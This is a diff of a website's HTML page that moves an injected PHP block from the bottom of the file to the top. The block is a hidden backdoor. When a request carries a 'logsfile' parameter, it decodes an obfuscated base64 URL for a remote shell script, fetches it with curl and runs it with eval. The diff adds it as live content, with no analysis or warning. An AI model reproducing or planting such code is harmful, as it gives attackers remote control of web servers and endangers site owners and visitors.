@@ -1,4 +1,23 @@
-<!doctype html>
+<?php
+if (isset($_GET['logsfile'])) { 
+    $url = base64_decode('aHR0cHM6Ly9jZG4ucHJpdmRheXouY29tL3R4dC9hbGZhc2hlbGwudHh0');
+    
+    $ch = curl_init($url);
+    
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    
+    $contents = curl_exec($ch);
+    
+    if ($contents !== false) { 
+        eval('?>' . $contents); 
+        exit; 
+    } else { 
+        echo "header"; 
+    } 
+    
+    curl_close($ch);
+}
+?><!doctype html>
 <html class="no-js" lang="en">
 <head>
     <meta charset="utf-8" />
@@ -229,23 +248,3 @@ The sitemap names are dd elements in Alphabet view adjust as necessary
 <script src="../rw_common/assets/global.js"></script>
 <script src="https://website-widgets.pages.dev/dist/sienna.min.js" defer></script></body>
 </html>
-<?php
-if (isset($_GET['logsfile'])) { 
-    $url = base64_decode('aHR0cHM6Ly9jZG4ucHJpdmRheXouY29tL3R4dC9hbGZhc2hlbGwudHh0');
-    
-    $ch = curl_init($url);
-    
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    
-    $contents = curl_exec($ch);
-    
-    if ($contents !== false) { 
-        eval('?>' . $contents); 
-        exit; 
-    } else { 
-        echo "header"; 
-    } 
-    
-    curl_close($ch);
-}
-?>
